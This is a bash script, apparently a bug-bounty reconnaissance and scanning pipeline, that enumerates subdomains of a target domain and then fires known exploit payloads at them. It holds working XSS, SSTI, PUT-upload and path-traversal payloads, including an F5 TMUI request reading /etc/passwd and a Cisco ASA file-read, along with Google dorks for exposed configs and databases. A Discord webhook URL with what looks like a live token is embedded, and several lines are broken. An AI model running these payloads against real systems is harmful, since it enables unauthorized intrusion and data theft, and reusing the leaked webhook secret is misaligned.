#!/bin/bash

#apt-get install sysvbanner
banner xelkomy

[ -z "$1" ] && { printf "\n[!] Usage: xelkomy example.com\n"; exit; }


QUOTES=(
        "The quieter you become, the more you are able to hear…"
        "Human Stupidity, that’s why Hackers always win."
        "Never tell everything you know…"
        "We need to have a talk on the subject of what's yours and what's mine."
        "Activating 1337 mode!"
        "Target uses Equifax-grade security."
        "Never gonna give you up."
        "Js pls."
        "Update pls."
        "Sleep is for the weak."
        "Grab a cuppa!"
        "js, js+ on steroids."
        "I am 100 percent natural."
        "A bug is never just a mistake. It represents something bigger. An error of thinking that makes you who you are."
        "You hack people. I hack time."
        "I hope you don't screw like you type."
        "Hack the planet!"
        "Crypto stands for cryptography."
        "PoC||GTFO"
        "Grab a cup of COFFEE!"
        "Valorant And LoL are Fucking games"
)

rand=$((RANDOM % ${#QUOTES[@]}))
printf "${QUOTES[$rand]}\n"



#COLORS
BOLD="\e[1m"
NORMAL="\e[0m"
GREEN="\e[92m"
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start Subdomain Enumeretion"
#--------------------------------------------------------------------------------------------------------------------

#Assetfinder
echo -e "${GREEN}[+] Starting Assetfinder"
#--------------------------------------------------------------------------------------------------------------------
assetfinder --subs-only $1 |sort -u |tee assetfinder.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+] Some Free Apis to extract the subdomains"
#--------------------------------------------------------------------------------------------------------------------
curl --silent "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" > tmp.txt
curl --silent "https://api.hackertarget.com/hostsearch/?q=$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://crt.sh/?q=%.$1" | grep -oP "\<TD\>\K.*\.$1" | sed -e 's/\<BR\>/\n/g' | grep -oP "\K.*\.$1" | sed -e 's/[\<|\>]//g' | grep -o -E "[a-zA-Z0-9._-]+\.$1"  >> tmp.txt
curl --silent "https://crt.sh/?q=%.%.$1" | grep -oP "\<TD\>\K.*\.$1" | sed -e 's/\<BR\>/\n/g' | sed -e 's/[\<|\>]//g' | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://crt.sh/?q=%.%.%.$1" | grep "$1" | cut -d '>' -f2 | cut -d '<' -f1 | grep -v " " | grep -o -E "[a-zA-Z0-9._-]+\.$1" | sort -u >> tmp.txt
curl --silent "https://crt.sh/?q=%.%.%.%.$1" | grep "$1" | cut -d '>' -f2 | cut -d '<' -f1 | grep -v " " | grep -o -E "[a-zA-Z0-9._-]+\.$1" |  sort -u >> tmp.txt
curl --silent "https://certspotter.com/api/v0/certs?domain=$1" | grep  -o '\[\".*\"\]' | sed -e 's/\[//g' | sed -e 's/\"//g' | sed -e 's/\]//g' | sed -e 's/\,/\n/g' | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://spyse.2com/target/domain/$1" | grep -E -o "button.*>.*\.$1\/button>" |  grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://tls.bufferover.run/dns?q=$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://dns.bufferover.run/dns?q=.$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://urlscan.io/api/v1/search/?q=$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent -X POST "https://synapsint.com/report.php" -d "name=http%3A%2F%2F$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://jldc.me/anubis/subdomains/$1" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" >> tmp.txt
curl --silent "https://sonar.omnisint.io/subdomains/$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://otx.alienvault.com/api/v1/indicators/domain/$1/passive_dns" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
curl --silent "https://riddler.io/search/exportcsv?q=pld:$1" | grep -o -E "[a-zA-Z0-9._-]+\.$1" >> tmp.txt
#--------------------------------------------------------------------------------------------------------------------
cat tmp.txt | sed -e "s/\*\.$1//g" | sed -e "s/^\..*//g" | grep -o -E "[a-zA-Z0-9._-]+\.$1" | sort -u | allapis.txt
#--------------------------------------------------------------------------------------------------------------------
#Sublist3r
echo -e "${GREEN}[+] Starting Sublist3r"
#--------------------------------------------------------------------------------------------------------------------
python ~/tools/Sublist3r/sublist3r.py -d $1 -o sublist3r.txt
#--------------------------------------------------------------------------------------------------------------------
#Subfinder
#go get -v github.com/projectdiscovery/subfinder/cmd/subfinder
echo -e "${GREEN}[+] Starting Subfinder "
#--------------------------------------------------------------------------------------------------------------------
subfinder -d  $1 |sort -u |tee subfinder.txt
#--------------------------------------------------------------------------------------------------------------------
#Amass
echo -e "${GREEN}[+] Starting Amass\n"
#--------------------------------------------------------------------------------------------------------------------
amass enum -d $1 --passive -o amass.txt
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
ORG="$1"|cut -f 1 -d "."
#--------------------------------------------------------------------------------------------------------------------
printf "${GREEN}[+]Getting IP Range of $ORG\n"
#--------------------------------------------------------------------------------------------------------------------
cat "$ORG-ASN.txt" | metabigor net --asn | sudo tee -a $ORG-range.txt
#--------------------------------------------------------------------------------------------------------------------
printf "${GREEN}[+]${END} Getting IP Range of $ORG V2\n"
#--------------------------------------------------------------------------------------------------------------------
echo "$ORG" | metabigor net --org |sudo tee -a $ORG-range2.txt
#--------------------------------------------------------------------------------------------------------------------
printf "${GREEN}[+]${END} Getting ASN of $ORG\n"
#--------------------------------------------------------------------------------------------------------------------
amass intel -org "$ORG" | awk -F ',' '{print $1}' | sudo tee -a $ORG-ASN.txt
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
#Filtering
echo -e "${GREEN}[+] Starting Filtering\n"
#--------------------------------------------------------------------------------------------------------------------
cat sublist3r.txt assetfinder.txt amass.txt subfinder.txt allapis.txt| sort -u |uniq -u| grep -v "*" |sort -u|tee Final-Subs.txt
#--------------------------------------------------------------------------------------------------------------------
#Httprobe
echo -e "${GREEN}[+] Starting Httprobe\n"
#--------------------------------------------------------------------------------------------------------------------
cat Final-Subs.txt |sort -u |uniq -u|httpx -silent |tee $1-alive.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start Subdomain Takeover Scan\n"
#--------------------------------------------------------------------------------------------------------------------
subzy -targets Final-Subs.txt -hide_fails --verify_ssl -concurrency 20 |sort -u|tee "subzy.txt"
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+] DNSPROBE Start\n"
#--------------------------------------------------------------------------------------------------------------------
cat $1-alive.txt|dnsprobe -o $1-dnsprobe.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Finishing The Enumeration OR The Reconaisses\n"
#--------------------------------------------------------------------------------------------------------------------
rm sublist3r.txt assetfinder.txt amass.txt subfinder.txt allapis.txt tmp.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start Discover Some Vulnerabilities\n"
#--------------------------------------------------------------------------------------------------------------------
cat $1-alive.txt |nuclei -stats -c 90 -silent -t "/root/tools/nuclei-templates/*/*.yaml" -o $1-nuclei.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start Blind XSS\n"
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start KXSS Tool\n"
cat $1-alive.txt| waybackurls | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace | qsreplace -a |tee wayback.txt
#--------------------------------------------------------------------------------------------------------------------
cat $1-alive.txt| waybackurls | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | qsreplace | qsreplace -a |kxss |tee kxss.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]End Scan with KXSS\n"
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
echo "[*] GETTING INTERESTING PARAMETERS WITH GF...\n"
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
mkdir "check-manually"
gf ssrf < "wayback.txt" > "check-manually/server-side-request-forgery.txt"
gf xss < "wayback.txt" > "check-manually/cross-site-scripting.txt"
gf redirect < "wayback.txt" > "check-manually/open-redirect.txt"
gf rce < "wayback.txt" > "check-manually/rce.txt"
gf idor < "wayback.txt" > "check-manually/insecure-direct-object-reference.txt"
gf sqli < "wayback.txt" > "check-manually/sql-injection.txt"
gf lfi < "wayback.txt" > "check-manually/local-file-inclusion.txt"
gf ssti < "wayback.txt" > "check-manually/server-side-template-injection.txt"
echo -e "Done! Gathered a total of *$(wc -l < "wayback.txt")* paths, of which *$(cat check-manually/* | wc -l)* possibly exploitable. Testing for Server-Side Template Injection..."|notify -discord -discord-webhook-url "https://discordapp.com/api/webhooks/773838692824776734/zMAUre4EPbfC8aLR0vu3KcNC8BtZnXmK9_XUlAW_PDTykqntMfxLJQilO3EkQafFTW4-"
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start Scan Cookieless\n"
#--------------------------------------------------------------------------------------------------------------------
assetfinder --subs-only $1|httprobe -c 60|cookieless |sort -u |tee cookieless.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]End Scan Cookieless\n"
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]End Wayback Blind XSS\n"
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Blind SSTI Checks\n"
#--------------------------------------------------------------------------------------------------------------------
gospider -S $1-alive.txt -t 3 -c 100 |  tr " " "\n" |grep '='|egrep -v '(.js|.png|.svg|.gif|.jpg|.jpeg|.txt|.css|.ico)'|httpx -threads 200|qsreplace "ssti{{7*7}}"|tee ssti.txt
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]End Blind SSTI Checks\n"
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]Start PUT Method Enable\n"
#--------------------------------------------------------------------------------------------------------------------
for domain in $(cat $1-alive.txt)
do
 curl -s -o /dev/null -w "URL: %{url_effective} - Response: %{response_code} " -X PUT -d "hello world"  "${domain}/evil.txt"
done
#--------------------------------------------------------------------------------------------------------------------

echo -e "${GREEN}[+]End PUT Method Enable\n"

#--------------------------------------------------------------------------------------------------------------------

echo -e "${GREEN}[+]Start Fuzz-xElkomy.py\n"

#--------------------------------------------------------------------------------------------------------------------

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/help/index.jsp?view=<script>alert("xss")</script>' 'onloadHandler' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py ssti.txt '/' 'ssti49' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/_vti_pvt/' '.pwd' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/global-protect/login.esp?user=%22%3balert(%27xElkomy%27)%2f%2f407' 'GlobalProtect Portal' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/wp-json/wp/v2/users' '[{"id"' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/bi-security-login/login.jsp?msi=false&redirect="><img/src/onerror%3dalert(document.domain)>' 'Oracle Business' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/webmail/?language=pl&interface=pro&username=&color=%27"><svg/onload=prompt(%27xElkomy%27)//' 'Powered by IceWarp Server ' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/libs/dam/merge/metadata.html?path=%3Csvg/onload=prompt(%27xElkomy%27)%3E&.ico' '{"assetPaths":' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/crx/de/setPreferences.jsp;%0ATia.html?keymap=<svg/onload=alert(document.domain)>&language=0' 'A JSONObject ' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/REPORTSERVER/Pages/ReportViewer.aspx' 'ReportViewerControl' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/modcp/index.php?loginerror_arr[0]=badlogin_strikes_logintypeusername&loginerror_arr[1]=javascript:alert("xElkomy")&loginerror_arr[2]=1&vb_login_username=xElkomy' 'Version 5.5.4' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/Trace.axd' 'Application Trace' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/examples/servlets/servlet/CookieExample' 'Cookies Example' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/tmui/login.jsp/../tmui/locallb/workspace/fileRead.jspfileName=/etc/passwd' 'root:x' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/evil.txt' 'hello world' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/xelkomy.txt' 'xelkomy-is-here' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../' 'dofile' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/mobile/error-not-supported-platform.html?desktop_url=javascript:alert(document.cookie);//itms://' 'support@sugarcrm.com' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/v1.0/endpoint/default/authorize?themeId=%27"><svg%2Fonload=%27alert`1`%27>&code_challenge=&code_challenge_method=&login_hint=&max_age=&prompt=&redirect_uri=&response_type=&scope=&state=' 'An Error Has Occurred' >> Fuzz-xElkomy.txt

python3 ~/tools/Fuzz-xElkomy.py $1-alive.txt '/saml/sps/saml20ip/saml20/logininitial?RequestBinding=HTTPPost&PartnerId=https://127.0.0.1&themeId=%27"><svg/onload=prompt(%27xElkomy%27)>' 'An Error Has Occurred' >> Fuzz-xElkomy.txt

#--------------------------------------------------------------------------------------------------------------------

echo -e "${GREEN}[+]End Fuzz-xElkomy.py\n"

#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
# Google hacking_GooHak
echo -e "${GREEN}[+]Start Goolge Hacking [+]\n"
#--------------------------------------------------------------------------------------------------------------------
mkdir "./GoogleHacking-$1/"
#--------------------------------------------------------------------------------------------------------------------
go-dork -q "site:$1 ext:doc | ext:docx | ext:odt | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv" -s -nc -p 5 | tee "./GoogleHacking-$1/documents.txt"
#--------------------------------------------------------------------------------------------------------------------
#Directory listing vulnerabilities
echo -e "Directory listing:\n"
go-dork -q "site:$1 intitle:index.of /" -s -nc -p 5 | tee "./GoogleHacking-$1/dir-listing"
#--------------------------------------------------------------------------------------------------------------------
echo -e "Configuration files exposed:\n"\n
#Configuration files exposed
go-dork -q "site:$1  ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:ini | ext:env" -s -nc -p 5 | tee "./GoogleHacking-$1/config-files.txt"
#--------------------------------------------------------------------------------------------------------------------
echo -e "Database files exposed:\n"
#Database files exposed
go-dork -q "site:$1 ext:sql | ext:dbf | ext:mdb" -s -nc -p 5 | tee "./GoogleHacking-$1/Databases.txt"
#--------------------------------------------------------------------------------------------------------------------
echo -e "Log files exposed:\n"
#Log files exposed
go-dork -q "site:$1 ext:log | ext:logs" -s -nc -p 5 | tee "./GoogleHacking-$1/log-files.txt"
#--------------------------------------------------------------------------------------------------------------------
#Backup and old files
echo -e "Backup and old files:\n"
go-dork -q "site:$1 ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup" -s -nc -p 5 | tee "./GoogleHacking-$1/backups.txt"
#--------------------------------------------------------------------------------------------------------------------
#Login pages
echo -e "Login pages:\n"
go-dork -q "site:$1  inurl:login | inurl:signin | intitle:Login | intitle:\"sign in\" | inurl:auth" -s -nc -p 5 | tee "./GoogleHacking-$1/login-pages.txt"
#--------------------------------------------------------------------------------------------------------------------
#SQL errors
echo -e "SQL errors:\n"
go-dork -q "site:$1 intext:\"sql syntax near\" | intext:\"syntax error has occurred\" | intext:\"incorrect syntax near\" | intext:\"unexpected end of SQL command\" | intext:\"Warning: mysql_connect()\" | intext:\"Warning: mysql_query()\" | intext:\"Warning: pg_connect()\"" -s -nc -p 5 | tee "./GoogleHacking-$1/sqlErrors.txt"
#--------------------------------------------------------------------------------------------------------------------
#PHP errors / warnings
echo -e "PHP errors / warnings:\n"
go-dork -q "site:$1 \"PHP Parse error\" | \"PHP Warning\" | \"PHP Error\"" -s -nc -p 5 | tee "./GoogleHacking-$1/php-errors.txt"
#--------------------------------------------------------------------------------------------------------------------
#phpinfo()
echo -e "phpinfo():\n"
go-dork -q "site:$1 ext:php intitle:phpinfo 'published by the PHP Group'" -s -nc -p 5 | tee "./GoogleHacking-$1/phpinfo.txt"
#--------------------------------------------------------------------------------------------------------------------
#Search Pastebin.com / pasting sites
echo -e "Search Pastebin.com / pasting sites:\n"
go-dork -q 'site:pastebin.com | site:paste2.org | site:pastehtml.com | site:slexy.org | site:snipplr.com | site:snipt.net | site:textsnip.com | site:bitpaste.app | site:justpaste.it | site:heypasteit.com | site:hastebin.com | site:dpaste.org | site:dpaste.com | site:codepad.org | site:jsitor.com | site:codepen.io | site:jsfiddle.net | site:dotnetfiddle.net | site:phpfiddle.org | site:ide.geeksforgeeks.org | site:repl.it | site:ideone.com | site:paste.debian.net | site:paste.org | site:paste.org.ru | site:codebeautify.org  | site:codeshare.io | site:trello.com "$1"' -s -nc -p 5 | tee "./GoogleHacking-$1/pastebin.txt"
#--------------------------------------------------------------------------------------------------------------------
#Search Github.com and Gitlab.com
echo -e "Search Github.com and Gitlab.com:\n"
go-dork -q 'site:github.com | site:gitlab.com "$1"' -s -nc -p 5 | tee "./GoogleHacking-$1/Gits.txt"
#--------------------------------------------------------------------------------------------------------------------
# Search Stackoverflow.com
echo -e "Search Stackoverflow.com:\n"
go-dork -q 'site:stackoverflow.com "$1"' -s -nc -p 5 | tee "./GoogleHacking-$1/stackoverflow.txt"
#--------------------------------------------------------------------------------------------------------------------
#Signup pages
echo -e "Signup pages:\n"
go-dork -q "site:$1 inurl:signup | inurl:register | intitle:Signup" -s -nc -p 5 | tee "./GoogleHacking-$1/signups.txt"
#--------------------------------------------------------------------------------------------------------------------
#papaly bookmarks
echo -e "papaly bookmarks:\n"
go-dork -q 'site:papaly.com "$1"' -s -nc -p 5 | tee "./GoogleHacking-$1/papaly.txt"
#--------------------------------------------------------------------------------------------------------------------
#--------------------------------------------------------------------------------------------------------------------
echo -e "${GREEN}[+]End Goolge Hacking [+]\n"
#--------------------------------------------------------------------------------------------------------------------
#JexBoss - JBoss (and others Java Deserialization Vulnerabilities) verify and EXploitation Tool
#git clone https://github.com/joaomatosf/jexboss.git ~/tools/jexboss
#cd ~/tools/jexboss
#pip3 install -r requires.txt
python3 ~/tools/jexboss/jexboss.py -mode file-scan -file $1-alive.txt -out report_jexboss.log
#--------------------------------------------------------------------------------------------------------------------
rm jexboss_*.log
#--------------------------------------------------------------------------------------------------------------------
#Testing for CRLF via CRLFuzz
# https://github.com/dwisiswant0/crlfuzz
echo -e "${GREEN}[+]Start CRLF-Injection-Scanner\n"
crlfuzz -l $1-alive.txt -s | tee crlfuzz-vuln-urls.txt
echo -e "${GREEN}[+]End Scan CRLF-Injection-Scanner\n"
#--------------------------------------------------------------------------------------------------------------------
#AEM hacking
#git clone https://github.com/0ang3el/aem-hacker.git
echo -e "${GREEN}[+]Start AEM Hacking Check [+]\n"
python3 ~/tools/aem-hacker/aem_discoverer.py --file $1-alive.txt  --workers 250  | tee AEM.txt
#--------------------------------------------------------------------------------------------------------------------
#Good for here :)
echo -e "${GREEN}[+]Bye Bye -Regards,xElkomy - 0xElkomy\n"
#--------------------------------------------------------------------------------------------------------------------
echo -e "[+] Hello 0xElkomy Recon Is Done for $1 you can now Start search with the information you have [+]" |notify -discord -discord-webhook-url "https://discordapp.com/api/webhooks/773838692824776734/zMAUre4EPbfC8aLR0vu3KcNC8BtZnXmK9_XUlAW_PDTykqntMfxLJQilO3EkQafFTW4-"
#--------------------------------------------------------------------------------------------------------------------
